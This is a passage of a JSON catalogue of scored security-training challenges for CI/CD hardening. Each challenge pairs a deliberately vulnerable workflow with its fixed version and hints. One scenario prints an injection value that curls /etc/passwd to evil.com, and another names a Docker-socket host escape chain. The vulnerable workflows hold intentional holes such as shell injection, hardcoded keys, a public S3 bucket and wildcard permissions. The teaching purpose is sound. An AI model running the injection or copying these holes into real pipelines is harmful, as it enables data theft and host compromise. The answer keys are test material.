    "vulnerableWorkflow": "name: PR Check\n\non:\n  pull_request:\n    branches: [main]\n\npermissions:\n  contents: read\n  pull-requests: read\n\njobs:\n  check:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Log PR title\n        run: |\n          echo \"Processing PR: ${{ github.event.pull_request.title }}\"\n\n      - name: Check PR description\n        run: |\n          echo \"Description: ${{ github.event.pull_request.body }}\"\n\n      - name: Validate\n        run: |\n          echo \"All checks passed for PR #${{ github.event.pull_request.number }}\"\n",
    "solutionWorkflow": "name: PR Check\n\non:\n  pull_request:\n    branches: [main]\n\npermissions:\n  contents: read\n  pull-requests: read\n\njobs:\n  check:\n    runs-on: ubuntu-latest\n    env:\n      PR_TITLE: ${{ github.event.pull_request.title }}\n      PR_BODY: ${{ github.event.pull_request.body }}\n      PR_NUMBER: ${{ github.event.pull_request.number }}\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Log PR title\n        run: |\n          echo \"Processing PR: $PR_TITLE\"\n\n      - name: Check PR description\n        run: |\n          echo \"Description: $PR_BODY\"\n\n      - name: Validate\n        run: |\n          echo \"All checks passed for PR #$PR_NUMBER\"\n",
    "hints": [
      "# Hint 1: The vulnerability\n\nWhen you write `echo \"${{ github.event.pull_request.title }}\"`, GitHub substitutes the title BEFORE bash sees it. If the title contains shell metacharacters, they execute as code.\n",
      "# Hint 2: Safe alternatives\n\nPass user input as an environment variable instead of interpolating directly:\n```yaml\nenv:\n  PR_TITLE: ${{ github.event.pull_request.title }}\nrun: echo \"$PR_TITLE\"\n```\nEnvironment variables are not subject to shell injection.\n"
    ],
    "hintsPenalty": 30
  },
  {
    "id": "oidc-misconfig",
    "title": "OIDC Trust Done Right",
    "level": "intermediate",
    "topic": "github-actions",
    "points": 150,
    "estimatedTime": "15m",
    "description": "This workflow uses OIDC for AWS authentication but the trust policy\nis too broad. Any repository in your org can assume the role.\nLock down the OIDC trust to specific repositories and branches.\n",
    "tags": [
      "oidc",
      "aws",
      "iam",
      "trust-policy"
    ],
    "scenario": "# Scenario: OIDC Misconfiguration\n\nYour team moved from static AWS credentials to OIDC federation — great! But the OIDC trust policy is overly broad. It allows ANY repository in your GitHub organization to assume the deployment role.\n\nA malicious repo in your org could use this role to access your production AWS resources.\n\n**Your mission:** Configure OIDC properly with the `aws-actions/configure-aws-credentials` action and ensure the workflow uses role assumption instead of static credentials.\n",
    "vulnerableWorkflow": "name: Deploy to AWS\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Configure AWS credentials\n        env:\n          AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE\n          AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n        run: |\n          echo \"Configuring AWS...\"\n\n      - name: Deploy\n        run: |\n          echo \"Deploying to S3...\"\n          echo \"Deploy complete\"\n",
    "solutionWorkflow": "name: Deploy to AWS\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n  id-token: write\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Configure AWS credentials\n        uses: aws-actions/configure-aws-credentials@v4\n        with:\n          role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy\n          aws-region: us-east-1\n\n      - name: Deploy\n        run: |\n          echo \"Deploying to S3...\"\n          echo \"Deploy complete\"\n",
    "hints": [
      "# Hint 1: Static vs OIDC\n\nLook for hardcoded `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` in the workflow. These should be replaced with OIDC-based authentication using `role-to-assume`.\n",
      "# Hint 2: The fix\n\nUse `aws-actions/configure-aws-credentials` with `role-to-assume` instead of static env vars. The OIDC token is automatically generated by GitHub Actions.\n"
    ],
    "hintsPenalty": 30
  },
  {
    "id": "self-hosted-risk",
    "title": "Self-Hosted Runner Risk",
    "level": "intermediate",
    "topic": "github-actions",
    "points": 150,
    "estimatedTime": "15m",
    "description": "This workflow uses self-hosted runners without container isolation.\nA malicious PR could persist on the runner and compromise future builds.\nSwitch to GitHub-hosted runners or add container isolation.\n",
    "tags": [
      "runners",
      "isolation",
      "supply-chain"
    ],
    "scenario": "# Scenario: Self-Hosted Runner Risk\n\nYour team uses self-hosted runners for faster builds. The problem: a malicious pull request ran code that installed a backdoor on the runner. Now every subsequent build — including builds that handle secrets — runs on a compromised machine.\n\nSelf-hosted runners persist between builds. Unlike GitHub-hosted runners which are fresh VMs every time, a compromised self-hosted runner stays compromised.\n\n**Your mission:** Replace self-hosted runners with GitHub-hosted runners, or add container isolation to limit the blast radius.\n",
    "vulnerableWorkflow": "name: Deploy\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n  id-token: write\n\njobs:\n  build:\n    runs-on: self-hosted\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup\n        run: npm ci\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n\n  deploy:\n    runs-on: self-hosted\n    needs: build\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Deploy\n        env:\n          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n        run: echo \"Deploying...\"\n",
    "solutionWorkflow": "name: Deploy\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n  id-token: write\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup\n        run: npm ci\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Deploy\n        env:\n          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n        run: echo \"Deploying...\"\n",
    "hints": [
      "# Hint 1: Why self-hosted is risky\n\nSelf-hosted runners persist between builds. If a malicious step installs a backdoor or modifies the runner, all future builds are compromised. GitHub-hosted runners are ephemeral — destroyed after each job.\n",
      "# Hint 2: The fix\n\nReplace `runs-on: self-hosted` with `runs-on: ubuntu-latest` (or another GitHub-hosted runner). If you must use self-hosted runners, add `container:` to run steps inside an isolated Docker container.\n"
    ],
    "hintsPenalty": 30
  },
  {
    "id": "docker-secrets-in-env",
    "title": "Secrets in Image Layers",
    "level": "intermediate",
    "topic": "docker",
    "points": 150,
    "estimatedTime": "15m",
    "description": "This workflow builds a Docker image with secrets baked into ENV layers.\nAnyone with image pull access can extract the secrets using docker history.\nUse build secrets or runtime environment variables instead.\n",
    "tags": [
      "docker",
      "secrets",
      "image-layers"
    ],
    "scenario": "# Scenario: Secrets in Image Layers\n\nYour CI pipeline builds Docker images with database credentials passed as build arguments and baked into ENV layers. The image is pushed to a public registry.\n\nAnyone can run `docker history` or inspect image layers to extract the hardcoded passwords. Even if you later remove the ENV instruction, the secret persists in the image layer history.\n\n**Your mission:** Remove secrets from the image build. Use runtime environment variables or Docker build secrets (`--secret`) instead.\n\n## What's at risk?\n- Database credentials exposed to anyone with image pull access\n- Secrets persist in image layer history forever\n- Compliance violations (SOC2, PCI DSS)\n",
    "vulnerableWorkflow": "name: Build Secure App\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Build image\n        run: |\n          cat <<'EOF' > Dockerfile\n          FROM node:20-slim\n          ENV DB_PASSWORD=supersecret123\n          ENV API_KEY=sk-live-abc123def456\n          WORKDIR /app\n          COPY package*.json ./\n          RUN npm ci --production\n          COPY src/ ./src/\n          CMD [\"node\", \"src/index.js\"]\n          EOF\n          docker build --build-arg AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI -t myapp:latest .\n\n      - name: Push image\n        run: docker push myapp:latest\n",
    "solutionWorkflow": "name: Build Secure App\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Build image\n        run: |\n          cat <<'EOF' > Dockerfile\n          FROM node:20-slim\n          WORKDIR /app\n          COPY package*.json ./\n          RUN npm ci --production\n          COPY src/ ./src/\n          CMD [\"node\", \"src/index.js\"]\n          EOF\n          docker build -t myapp:latest .\n\n      - name: Push image\n        run: docker push myapp:latest\n",
    "hints": [
      "# Hint 1: How secrets leak in images\n\n`ENV DB_PASSWORD=secret` or `--build-arg DB_PASSWORD=secret` creates a layer that stores the secret. `docker history --no-trunc` reveals it. Even multi-stage builds don't help if the secret is in the final stage's ENV.\n",
      "# Hint 2: The fix\n\nPass secrets at runtime via `docker run -e DB_PASSWORD=$SECRET` or use Docker BuildKit secrets: `RUN --mount=type=secret,id=dbpass cat /run/secrets/dbpass`. Never bake secrets into image layers.\n"
    ],
    "hintsPenalty": 30
  },
  {
    "id": "k8s-no-network-policy",
    "title": "Open Network Chaos",
    "level": "intermediate",
    "topic": "kubernetes",
    "points": 150,
    "estimatedTime": "15m",
    "description": "This workflow deploys multiple microservices without any NetworkPolicy.\nAny pod can communicate with any other pod — including databases, payment\nservices, and admin panels. Add NetworkPolicies to isolate your services.\n",
    "tags": [
      "kubernetes",
      "network-policy",
      "segmentation"
    ],
    "scenario": "# Scenario: Open Network Chaos\n\nYour cluster runs multiple microservices: a web frontend, an API backend, a database, and a payment service. All deployed without any NetworkPolicy.\n\nBy default, Kubernetes allows all pod-to-pod communication. This means:\n- A compromised frontend pod can directly access the database\n- Any pod can reach the payment service\n- Lateral movement is trivial for attackers\n\n**Your mission:** Add NetworkPolicy resources to restrict traffic flow. The frontend should only reach the API, the API should only reach the database, and the payment service should be isolated.\n\n## Key principle\nZero-trust networking: deny all by default, then allow specific paths.\n",
    "vulnerableWorkflow": "name: Deploy Microservices\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Deploy services\n        run: |\n          cat <<'EOF' > services.yml\n          apiVersion: apps/v1\n          kind: Deployment\n          metadata:\n            name: frontend\n          spec:\n            replicas: 2\n            selector:\n              matchLabels:\n                app: frontend\n            template:\n              metadata:\n                labels:\n                  app: frontend\n              spec:\n                containers:\n                  - name: frontend\n                    image: frontend:latest\n          ---\n          apiVersion: apps/v1\n          kind: Deployment\n          metadata:\n            name: api\n          spec:\n            replicas: 2\n            selector:\n              matchLabels:\n                app: api\n            template:\n              metadata:\n                labels:\n                  app: api\n              spec:\n                containers:\n                  - name: api\n                    image: api:latest\n          ---\n          apiVersion: apps/v1\n          kind: Deployment\n          metadata:\n            name: database\n          spec:\n            replicas: 1\n            selector:\n              matchLabels:\n                app: database\n            template:\n              metadata:\n                labels:\n                  app: database\n              spec:\n                containers:\n                  - name: database\n                    image: postgres:16\n          EOF\n          kubectl apply -f services.yml\n",
    "solutionWorkflow": "name: Deploy Microservices\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Deploy network policies\n        run: |\n          cat <<'EOF' > network-policy.yml\n          apiVersion: networking.k8s.io/v1\n          kind: NetworkPolicy\n          metadata:\n            name: default-deny-ingress\n          spec:\n            podSelector: {}\n            policyTypes:\n              - Ingress\n          ---\n          apiVersion: networking.k8s.io/v1\n          kind: NetworkPolicy\n          metadata:\n            name: allow-frontend-to-api\n          spec:\n            podSelector:\n              matchLabels:\n                app: api\n            ingress:\n              - from:\n                  - podSelector:\n                      matchLabels:\n                        app: frontend\n          ---\n          apiVersion: networking.k8s.io/v1\n          kind: NetworkPolicy\n          metadata:\n            name: allow-api-to-db\n          spec:\n            podSelector:\n              matchLabels:\n                app: database\n            ingress:\n              - from:\n                  - podSelector:\n                      matchLabels:\n                        app: api\n          EOF\n          kubectl apply -f network-policy.yml\n\n      - name: Deploy services\n        run: |\n          cat <<'EOF' > services.yml\n          apiVersion: apps/v1\n          kind: Deployment\n          metadata:\n            name: frontend\n          spec:\n            replicas: 2\n            selector:\n              matchLabels:\n                app: frontend\n            template:\n              metadata:\n                labels:\n                  app: frontend\n              spec:\n                containers:\n                  - name: frontend\n                    image: frontend:latest\n          ---\n          apiVersion: apps/v1\n          kind: Deployment\n          metadata:\n            name: api\n          spec:\n            replicas: 2\n            selector:\n              matchLabels:\n                app: api\n            template:\n              metadata:\n                labels:\n                  app: api\n              spec:\n                containers:\n                  - name: api\n                    image: api:latest\n          ---\n          apiVersion: apps/v1\n          kind: Deployment\n          metadata:\n            name: database\n          spec:\n            replicas: 1\n            selector:\n              matchLabels:\n                app: database\n            template:\n              metadata:\n                labels:\n                  app: database\n              spec:\n                containers:\n                  - name: database\n                    image: postgres:16\n          EOF\n          kubectl apply -f services.yml\n",
    "hints": [
      "# Hint 1: Default behavior\n\nKubernetes has no network isolation by default. All pods can communicate with all other pods across all namespaces. NetworkPolicy is the mechanism to restrict this.\n",
      "# Hint 2: The fix\n\nCreate a NetworkPolicy with `policyTypes: [\"Ingress\"]` and `ingress: []` to deny all ingress by default. Then add specific allow rules for each service's legitimate traffic sources.\n"
    ],
    "hintsPenalty": 30
  },
  {
    "id": "tf-public-s3",
    "title": "Public S3 Bucket",
    "level": "intermediate",
    "topic": "terraform",
    "points": 150,
    "estimatedTime": "15m",
    "description": "This workflow creates an S3 bucket with public read access. Sensitive data\nstored in the bucket is exposed to the entire internet. Use private ACLs\nand enable public access blocks.\n",
    "tags": [
      "terraform",
      "aws",
      "s3",
      "public-access"
    ],
    "scenario": "# Scenario: Public S3 Bucket\n\nYour Terraform configuration creates an S3 bucket with `acl = \"public-read\"` and `block_public_acls = false`. The bucket is used to store application backups and log files.\n\nAnyone on the internet can list and download the bucket contents. This includes:\n- Application source code\n- Database backups with credentials\n- Log files with user data and PII\n- Internal configuration files\n\nThis is one of the most common AWS misconfigurations and a frequent cause of data breaches.\n\n**Your mission:** Change the ACL to private and enable public access blocks.\n",
    "vulnerableWorkflow": "name: Terraform Apply\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Terraform\n        uses: hashicorp/setup-terraform@v3\n\n      - name: Init\n        run: terraform init\n\n      - name: Apply\n        run: |\n          cat <<'EOF' > main.tf\n          resource \"aws_s3_bucket\" \"data\" {\n            bucket = \"myapp-backups\"\n          }\n\n          resource \"aws_s3_bucket_acl\" \"data\" {\n            bucket = aws_s3_bucket.data.id\n            acl    = \"public-read\"\n          }\n\n          resource \"aws_s3_bucket_public_access_block\" \"data\" {\n            bucket                  = aws_s3_bucket.data.id\n            block_public_acls       = false\n            block_public_policy     = false\n            ignore_public_acls      = false\n            restrict_public_buckets = false\n          }\n          EOF\n          terraform init\n          terraform apply -auto-approve\n",
    "solutionWorkflow": "name: Terraform Apply\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Terraform\n        uses: hashicorp/setup-terraform@v3\n\n      - name: Init\n        run: terraform init\n\n      - name: Apply\n        run: |\n          cat <<'EOF' > main.tf\n          resource \"aws_s3_bucket\" \"data\" {\n            bucket = \"myapp-backups\"\n          }\n\n          resource \"aws_s3_bucket_acl\" \"data\" {\n            bucket = aws_s3_bucket.data.id\n            acl    = \"private\"\n          }\n\n          resource \"aws_s3_bucket_public_access_block\" \"data\" {\n            bucket                  = aws_s3_bucket.data.id\n            block_public_acls       = true\n            block_public_policy     = true\n            ignore_public_acls      = true\n            restrict_public_buckets = true\n          }\n          EOF\n          terraform init\n          terraform apply -auto-approve\n",
    "hints": [
      "# Hint 1: Public ACL values\n\n`acl = \"public-read\"` allows anyone on the internet to list and get objects. `block_public_acls = false` disables the safety mechanism that prevents public ACLs. Both must be fixed.\n",
      "# Hint 2: The fix\n\nSet `acl = \"private\"` and enable all four `block_public_*` attributes: `block_public_acls = true`, `block_public_policy = true`, `ignore_public_acls = true`, `restrict_public_buckets = true`.\n"
    ],
    "hintsPenalty": 30
  },
  {
    "id": "mon-silent-failure",
    "title": "Silent Failures",
    "level": "intermediate",
    "topic": "monitoring",
    "points": 150,
    "estimatedTime": "15m",
    "description": "This workflow fails silently — broken steps are hidden with continue-on-error,\nand there are no failure notifications. Bad deploys go unnoticed for hours.\nRemove error suppression and add failure alerts.\n",
    "tags": [
      "monitoring",
      "alerts",
      "error-handling"
    ],
    "scenario": "# Scenario: Silent Failure\n\nYour deploy pipeline has `continue-on-error: true` on critical steps like testing, security scanning, and deployment verification. The pipeline \"succeeds\" even when tests fail, vulnerabilities are found, or health checks fail.\n\nThe team only discovers issues when users report them — hours or days after deployment. There are no alerts, no notifications, no Slack messages. Failures vanish into the void.\n\n**Your mission:** Remove `continue-on-error: true` from critical steps and add a failure notification step that alerts the team.\n",
    "vulnerableWorkflow": "name: Deploy\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Install\n        run: npm ci\n\n      - name: Test\n        run: npm test\n        continue-on-error: true\n\n      - name: Security scan\n        run: npm audit --audit-level=high\n        continue-on-error: true\n\n      - name: Build\n        run: npm run build\n\n      - name: Deploy\n        run: |\n          echo \"Deploying to production...\"\n          echo \"Deploy complete\"\n        continue-on-error: true\n\n      - name: Health check\n        run: |\n          echo \"Checking health endpoint...\"\n          echo \"Health check passed\"\n        continue-on-error: true\n",
    "solutionWorkflow": "name: Deploy\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Install\n        run: npm ci\n\n      - name: Test\n        run: npm test\n\n      - name: Security scan\n        run: npm audit --audit-level=high\n\n      - name: Build\n        run: npm run build\n\n      - name: Deploy\n        run: |\n          echo \"Deploying to production...\"\n          echo \"Deploy complete\"\n\n      - name: Health check\n        run: |\n          echo \"Checking health endpoint...\"\n          echo \"Health check passed\"\n\n      - name: Notify on failure\n        if: failure()\n        env:\n          REPO: ${{ github.repository }}\n          SHA: ${{ github.sha }}\n          REF: ${{ github.ref_name }}\n        run: |\n          echo \"DEPLOYMENT FAILED - alerting team\"\n          echo \"Repository: $REPO\"\n          echo \"Commit: $SHA\"\n          echo \"Branch: $REF\"\n",
    "hints": [
      "# Hint 1: continue-on-error danger\n\n`continue-on-error: true` makes a failing step report as \"success\" to GitHub. The pipeline continues as if nothing went wrong. Critical failures — test failures, security issues, deployment problems — are silently swallowed.\n",
      "# Hint 2: The fix\n\nRemove `continue-on-error: true` from all critical steps. Add a notification step with `if: failure()` that sends alerts via Slack webhook, email, or GitHub Issues. The `always()` condition ensures notifications run even when previous steps fail.\n"
    ],
    "hintsPenalty": 30
  },
  {
    "id": "reusable-workflow-injection",
    "title": "Reusable Workflow Injection",
    "level": "advanced",
    "topic": "github-actions",
    "points": 200,
    "estimatedTime": "25m",
    "description": "This reusable workflow accepts inputs from caller workflows and passes\nthem directly into shell commands via expression interpolation. An attacker\ncan craft a malicious caller workflow to inject arbitrary code.\nSanitize all inputs before using them in run steps.\n",
    "tags": [
      "injection",
      "reusable-workflows",
      "inputs"
    ],
    "scenario": "# Scenario: Reusable Workflow Injection\n\nYour team created a reusable workflow for shared CI/CD tasks. It accepts `inputs` from caller workflows and uses them in `run:` steps via `${{ inputs.name }}` interpolation.\n\nThe problem: GitHub Actions substitutes `${{ inputs.* }}` BEFORE bash sees the command. If a caller passes a malicious value like:\n\n```\nname: \"test\"; curl https://evil.com/steal -d @/etc/passwd\"\n```\n\nIt becomes arbitrary code execution. Any repository in your org that calls this reusable workflow can exploit it.\n\n**Your mission:** Refactor the reusable workflow to pass inputs through environment variables instead of direct expression interpolation.\n\n## Key concepts\n- `${{ inputs.x }}` is substituted pre-shell — injection risk\n- `env: { VAR: ${{ inputs.x }} }` followed by `$VAR` in shell — safe\n- Environment variables are not subject to shell injection\n",
    "vulnerableWorkflow": "name: Reusable Deploy\n\non:\n  workflow_call:\n    inputs:\n      environment:\n        required: true\n        type: string\n      version:\n        required: false\n        type: string\n        default: 'latest'\n    secrets:\n      AWS_ACCESS_KEY_ID:\n        required: true\n      AWS_SECRET_ACCESS_KEY:\n        required: true\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Deploy to environment\n        run: |\n          echo \"Deploying version ${{ inputs.version }} to ${{ inputs.environment }}\"\n          echo \"Running deploy script for ${{ inputs.environment }}\"\n\n      - name: Notify\n        run: |\n          echo \"Deployment of ${{ inputs.version }} to ${{ inputs.environment }} complete\"\n",
    "solutionWorkflow": "name: Reusable Deploy\n\non:\n  workflow_call:\n    inputs:\n      environment:\n        required: true\n        type: string\n      version:\n        required: false\n        type: string\n        default: 'latest'\n    secrets:\n      AWS_ACCESS_KEY_ID:\n        required: true\n      AWS_SECRET_ACCESS_KEY:\n        required: true\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    env:\n      DEPLOY_ENV: ${{ inputs.environment }}\n      DEPLOY_VERSION: ${{ inputs.version }}\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Deploy to environment\n        run: |\n          echo \"Deploying version $DEPLOY_VERSION to $DEPLOY_ENV\"\n          echo \"Running deploy script for $DEPLOY_ENV\"\n\n      - name: Notify\n        run: |\n          echo \"Deployment of $DEPLOY_VERSION to $DEPLOY_ENV complete\"\n",
    "hints": [
      "# Hint 1: The injection mechanism\n\nWhen you write `run: echo \"${{ inputs.name }}\"`, GitHub replaces the expression with the actual value BEFORE bash parses the command. If the value contains shell metacharacters (`;`, `|`, `$()`), they execute as code.\n",
      "# Hint 2: The safe pattern\n\nPass inputs through an `env:` block:\n```yaml\nenv:\n  INPUT_NAME: ${{ inputs.name }}\nrun: echo \"$INPUT_NAME\"\n```\nEnvironment variables are not substituted by the shell parser — they're literal strings.\n"
    ],
    "hintsPenalty": 50
  },
  {
    "id": "docker-socket-mount",
    "title": "Docker Socket Escape",
    "level": "advanced",
    "topic": "docker",
    "points": 200,
    "estimatedTime": "20m",
    "description": "This workflow mounts the Docker socket into a build container for\nDocker-in-Docker builds. This gives the container full control over\nthe host's Docker daemon — effectively root access.\nUse remote builders or kaniko instead.\n",
    "tags": [
      "docker",
      "socket",
      "privilege-escalation"
    ],
    "scenario": "# Scenario: Docker Socket Escape\n\nYour CI pipeline uses Docker-in-Docker (DinD) by mounting `/var/run/docker.sock` into the build container. This lets the build container create new containers on the host.\n\nThe Docker socket is equivalent to root access. A compromised build container can:\n1. Create a privileged container that mounts the host filesystem\n2. Extract all secrets from other containers\n3. Install persistent backdoors on the host\n4. Pivot to other machines on the network\n\n**Your mission:** Remove the Docker socket mount. Use a remote Docker builder, kaniko, or buildx with a remote builder instead.\n\n## Attack chain\n```\nContainer with docker.sock → docker run -v /:/host alpine → chroot /host → full host compromise\n```\n",
    "vulnerableWorkflow": "name: Build with DinD\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    container:\n      image: docker:24-dind\n      volumes:\n        - /var/run/docker.sock:/var/run/docker.sock\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Build image\n        run: |\n          docker build -t myapp:latest .\n\n      - name: Push image\n        run: |\n          docker push myapp:latest\n",
    "solutionWorkflow": "name: Build with Buildx\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Set up Docker Buildx\n        uses: docker/setup-buildx-action@v3\n\n      - name: Build and push\n        uses: docker/build-push-action@v5\n        with:\n          context: .\n          push: true\n          tags: myapp:latest\n          cache-from: type=gha\n          cache-to: type=gha,mode=max\n",
    "hints": [
      "# Hint 1: Why docker.sock is dangerous\n\nMounting `/var/run/docker.sock` gives the container full control over the Docker daemon. It can create containers with `-v /:/host` to mount the entire host filesystem, effectively gaining root access.\n",
      "# Hint 2: Safer alternatives\n\nUse `docker buildx create --driver remote` for remote builders, or use Google's kaniko for building images without Docker daemon access. GitHub Actions also offers `docker/build-push-action` with BuildKit remote builders.\n"
    ],
    "hintsPenalty": 50
  },
  {
    "id": "k8s-rbac-escalation",
    "title": "RBAC Privilege Escalation",
    "level": "advanced",
    "topic": "kubernetes",
    "points": 200,
    "estimatedTime": "20m",
    "description": "This workflow applies RBAC rules with wildcard verbs and resources.\nAny pod with the bound ServiceAccount can read secrets, create pods,\nand escalate to cluster-admin. Apply least-privilege RBAC.\n",
    "tags": [
      "kubernetes",
      "rbac",
      "privilege-escalation"
    ],
    "scenario": "# Scenario: RBAC Privilege Escalation\n\nYour CI pipeline applies a ClusterRole and ClusterRoleBinding with wildcard permissions (`verbs: [\"*\"]`, `resources: [\"*\"]`). This was done for \"convenience\" so the app wouldn't hit permission errors.\n\nThe problem: any pod that uses the bound ServiceAccount can:\n- Read all Secrets in the cluster (including credentials)\n- Create new pods that mount host filesystems\n- Create new ClusterRoleBindings to grant itself admin access\n- Essentially become cluster-admin\n\n**Your mission:** Replace wildcard permissions with specific, least-privilege rules. Only grant the exact verbs and resources the application needs.\n\n## The escalation chain\n```\nWildcard ClusterRole → read Secrets → mount host → full cluster compromise\n```\n",
    "vulnerableWorkflow": "name: Setup RBAC\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Apply RBAC\n        run: |\n          cat <<'EOF' > rbac.yml\n          apiVersion: rbac.authorization.k8s.io/v1\n          kind: ClusterRole\n          metadata:\n            name: app-role\n          rules:\n            - apiGroups: [\"\"]\n              resources: [\"*\"]\n              verbs: [\"*\"]\n            - apiGroups: [\"apps\"]\n              resources: [\"*\"]\n              verbs: [\"*\"]\n            - apiGroups: [\"batch\"]\n              resources: [\"*\"]\n              verbs: [\"*\"]\n          ---\n          apiVersion: rbac.authorization.k8s.io/v1\n          kind: ClusterRoleBinding\n          metadata:\n            name: app-role-binding\n          subjects:\n            - kind: ServiceAccount\n              name: app-sa\n              namespace: default\n          roleRef:\n            kind: ClusterRole\n            name: app-role\n            apiGroup: rbac.authorization.k8s.io\n          EOF\n          kubectl apply -f rbac.yml\n",
    "solutionWorkflow": "name: Setup RBAC\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Apply RBAC\n        run: |\n          cat <<'EOF' > rbac.yml\n          apiVersion: rbac.authorization.k8s.io/v1\n          kind: Role\n          metadata:\n            name: app-role\n            namespace: default\n          rules:\n            - apiGroups: [\"\"]\n              resources: [\"pods\", \"services\", \"configmaps\"]\n              verbs: [\"get\", \"list\", \"watch\"]\n            - apiGroups: [\"apps\"]\n              resources: [\"deployments\"]\n              verbs: [\"get\", \"list\", \"watch\"]\n          ---\n          apiVersion: rbac.authorization.k8s.io/v1\n          kind: RoleBinding\n          metadata:\n            name: app-role-binding\n            namespace: default\n          subjects:\n            - kind: ServiceAccount\n              name: app-sa\n              namespace: default\n          roleRef:\n            kind: Role\n            name: app-role\n            apiGroup: rbac.authorization.k8s.io\n          EOF\n          kubectl apply -f rbac.yml\n",
    "hints": [
      "# Hint 1: Why wildcards are dangerous\n\n`verbs: [\"*\"]` means ALL operations (get, list, watch, create, update, patch, delete). `resources: [\"*\"]` means ALL resource types including Secrets, Pods, and RoleBindings. Together, they grant full cluster admin access.\n",
      "# Hint 2: The fix\n\nReplace `resources: [\"*\"]` with specific resources like `[\"pods\", \"services\", \"configmaps\"]`. Replace `verbs: [\"*\"]` with only needed verbs like `[\"get\", \"list\", \"watch\"]`. Never grant `secrets` access unless absolutely required.\n"
    ],
    "hintsPenalty": 50
  },
  {
    "id": "tf-iam-wildcard",
    "title": "IAM Wildcard Policies",
    "level": "advanced",
    "topic": "terraform",
    "points": 200,
    "estimatedTime": "20m",
    "description": "This workflow creates IAM policies with wildcard actions and resources.\nAny entity with this policy can do anything to any AWS resource.\nApply least-privilege IAM with specific actions and resource ARNs.\n",
    "tags": [
      "terraform",
      "aws",
      "iam",
      "least-privilege"
    ],
    "scenario": "# Scenario: IAM Wildcard Policies\n\nYour Terraform creates an IAM policy with `\"Action\": \"*\"` and `\"Resource\": \"*\"`. This grants the entity (user, role, or service) full access to every AWS service and resource.\n\nThis is equivalent to giving someone the AWS root credentials. If the credentials leak (via compromised CI, leaked env var, or social engineering), the attacker can:\n- Access all S3 buckets\n- Modify any infrastructure\n- Create backdoor IAM users\n- Exfiltrate all data\n\n**Your mission:** Replace wildcards with specific actions and resource ARNs. Only grant what the application actually needs.\n\n## Example of least-privilege\nInstead of `\"Action\": \"*\"`, use `\"Action\": [\"s3:GetObject\", \"s3:PutObject\"]`\nInstead of `\"Resource\": \"*\"`, use `\"Resource\": \"arn:aws:s3:::my-bucket/*\"`\n",
